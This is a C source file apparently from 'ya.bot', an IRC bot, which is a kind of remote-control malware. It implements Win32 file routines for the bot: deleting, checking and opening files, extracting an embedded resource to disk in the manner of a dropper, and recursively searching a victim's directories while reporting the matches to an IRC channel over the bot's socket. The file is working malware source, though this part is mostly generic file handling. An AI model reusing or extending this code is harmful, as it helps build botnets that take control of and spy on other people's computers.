/*  ya.bot  */

#include "bot.h"

bool file_delete(char *pszFilePath)
{

#ifndef NO_DEBUG
		debug_print("Deleting file, file_delete()");
#endif

	if (!file_exists(pszFilePath))
			return FALSE;
	if (!DeleteFile(pszFilePath))
			return FALSE;
		return TRUE;
}

bool file_exists(char *pszFilePath)
{
	HANDLE hFile;

#ifndef NO_DEBUG
		debug_print("Checking if file exists, file_exists()");
#endif

		hFile = CreateFile(pszFilePath,
				GENERIC_READ,
				FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
	if (hFile == INVALID_HANDLE_VALUE)
			return FALSE;
		CloseHandle(hFile);
		return TRUE;
}

bool file_extractresource(char *pszResourceName, char *pszResourceType, char *pszExtractPath)
{
	DWORD dwSize, dwWritten = 0;
	HANDLE hFile;
	HGLOBAL hResourceData;
	HMODULE hModule;
	HRSRC hResourceLocation;
	LPVOID pResource;

#ifndef NO_DEBUG
		debug_print("Extracting resource, file_extractresource()");
#endif

		hModule = GetModuleHandle(NULL);
	if (!hModule)
			return FALSE;
		hResourceLocation = FindResource(hModule, pszResourceName, pszResourceType);
	if (!hResourceLocation)
			return FALSE;
		dwSize = SizeofResource(hModule, hResourceLocation);
		hResourceData = LoadResource(hModule, hResourceLocation);
	if (!hResourceData)
			return FALSE;
		pResource = LockResource(hResourceData);
	if (!pResource)
			return FALSE;
		hFile = CreateFile(pszExtractPath,
				GENERIC_WRITE,
				0,
				NULL,
				CREATE_ALWAYS,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
	if (hFile == INVALID_HANDLE_VALUE)
			return FALSE;
		WriteFile(hFile, pResource, dwSize, &dwWritten, NULL);
	if (dwWritten != dwSize)
	{
			CloseHandle(hFile);
			return FALSE;
	}
		CloseHandle(hFile);
		return TRUE;
}

DWORD file_filesize(char *pszFilePath)
{
	DWORD dwSize;
	HANDLE hFile;
		hFile = CreateFile(pszFilePath,
				GENERIC_READ,
				FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
	if (hFile == INVALID_HANDLE_VALUE)
			return 0;
		dwSize = GetFileSize(hFile, NULL);
		CloseHandle(hFile);
		return dwSize;
}

#ifndef NO_FILEFIND
int file_find(char *pszFileName,
		char *pszDirectoryName,
		bool bSubDirectories,
		SOCKET bsock,
		char *pszAction,
		char *pszDestination,
		bool bSilent,
		bool bVerbose)
{
	char szDirectory[MAX_PATH];
	HANDLE hFind;
	int nFiles = 0, nTotalFiles = 0;
	WIN32_FIND_DATA fdFileData;

#ifndef NO_DEBUG
		debug_print("Searching for file, file_find()");
#endif

		_snprintf(szDirectory, sizeof(szDirectory) - 1, string_filefinddirectory, pszDirectoryName);
		hFind = FindFirstFile(szDirectory, &fdFileData);
	if (hFind == INVALID_HANDLE_VALUE)
			return 0;
	if (fdFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
	{
		if (bSubDirectories)
		{
			if (fdFileData.cFileName[0] != '.')
			{
					_snprintf(szDirectory, sizeof(szDirectory) - 1,
							string_filepath,
							pszDirectoryName,
							fdFileData.cFileName);
					nFiles = file_find(pszFileName,
							szDirectory,
							bSubDirectories,
							bsock,
							pszAction,
							pszDestination,
							bSilent,
							bVerbose);
					nTotalFiles = nTotalFiles + nFiles;
			}
		}
	}
	else
	{
		if ((fdFileData.cFileName[0] != '.') && (wcstrcmp(fdFileData.cFileName, pszFileName)))
		{
				Sleep(FLOOD_DELAY);
			if (!bSilent)
					irc_message(bsock, pszAction, pszDestination,
								(char *)string_filefoundfile,
								CGREEN, string_replyfile, CEND, string_replydotbot,
								CBLUE, CEND, pszDirectoryName, fdFileData.cFileName);
				Sleep(FLOOD_DELAY);
				nTotalFiles++;
		}
	}
	while (FindNextFile(hFind, &fdFileData) != 0)
	{
		if (fdFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
		{
			if (bSubDirectories)
			{
				if (fdFileData.cFileName[0] != '.')
				{
						_snprintf(szDirectory, sizeof(szDirectory) - 1,
								string_filepath,
								pszDirectoryName,
								fdFileData.cFileName);
						nFiles = file_find(pszFileName,
								szDirectory,
								bSubDirectories,
								bsock,
								pszAction,
								pszDestination,
								bSilent,
								bVerbose);
						nTotalFiles = nTotalFiles + nFiles;
				}
			}
		}
		else
		{
			if ((fdFileData.cFileName[0] != '.') && (wcstrcmp(fdFileData.cFileName, pszFileName)))
			{
					Sleep(FLOOD_DELAY);
				if (!bSilent)
						irc_message(bsock, pszAction, pszDestination,
								(char *)string_filefoundfile,
								CGREEN, string_replyfile, CEND, string_replydotbot,
								CBLUE, CEND, pszDirectoryName, fdFileData.cFileName);
					Sleep(FLOOD_DELAY);
					nTotalFiles++;
			}
		}
	}
		FindClose(hFind);
		return nTotalFiles;
}

DWORD WINAPI file_findmain(LPVOID param)
{
	SFileFind s_ff = *((SFileFind *)param);

#ifndef NO_DEBUG
		debug_print("Finding file, file_findmain()");
#endif

	if ((!s_ff.m_bSilent) && (s_ff.m_bVerbose))
			irc_message(s_ff.m_bsock, s_ff.m_szAction, s_ff.m_szDestination,
					(char *)string_filesearchingforfile,
					CBLUE, string_replyfile, CEND, string_replydotbot);
		file_find(s_ff.m_szFileName,
				s_ff.m_szDirectoryName,
				s_ff.m_bSubDirectories,
				s_ff.m_bsock,
				s_ff.m_szAction,
				s_ff.m_szDestination,
				s_ff.m_bSilent,
				s_ff.m_bVerbose);
	if ((!s_ff.m_bSilent) && (s_ff.m_bVerbose))
			irc_message(s_ff.m_bsock, s_ff.m_szAction, s_ff.m_szDestination,
					(char *)string_fileendofsearch,
					CBLUE, string_replyfile, CEND, string_replydotbot);
		thread_remove(THREAD_FILEFIND);
		return 0;
}
#endif

bool file_open(char *pszFilePath)
{

#ifndef NO_DEBUG
		debug_print("Opening file, file_open()");
#endif

	if ((int)ShellExecute(NULL,
				string_fileopen,
				pszFilePath,
				NULL,
				NULL,
				SW_SHOW) < 32) return FALSE;
		return TRUE;
}